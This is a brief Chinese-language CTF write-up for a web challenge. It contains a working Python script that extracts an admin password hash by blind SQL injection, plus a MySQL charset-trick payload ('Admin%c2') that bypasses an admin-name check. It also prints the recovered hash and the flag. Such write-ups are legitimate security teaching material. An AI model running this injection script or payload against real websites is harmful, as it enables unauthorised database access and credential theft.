## web100 writeup 

sql注入就不再多说了,不懂的看个题.
[https://github.com/wonderkun/CTF_web/tree/master/web300-2](https://github.com/wonderkun/CTF_web/tree/master/web300-2)

直接给出注出passwd的poc吧:
```python
#!/usr/bin/python
# coding:utf-8 

import requests 

def getPassword():
    url = "http://117.34.111.15:89?action=show"
    # data = {"username":}
    username = "admin'^!(mid((passwd)from(-{pos}))='{passwd}')='1"
    strBase = "1234567890abcdef"
    passwd = ""
    for k in range(1,34):
        print passwd
        for i in strBase:
            passwdTmp = i+passwd
            data = {"username":username.format(pos=str(k),passwd=passwdTmp)}
            
            # print data
            res = requests.post(url,data)
            if "admin" in res.text:
                passwd = passwdTmp
                break  


if __name__ == "__main__":
    getPassword()
```
最后用 mysql的utf-8字符编码问题,绕过对admin的判断,参考[https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html),最后post
```
username=Admin%c2&passwd=37b1d2f04f594bfffc826fd69e389688
```
拿到flag: flag{e4d93a53bbe9a2f9c419086c16439aa7} 
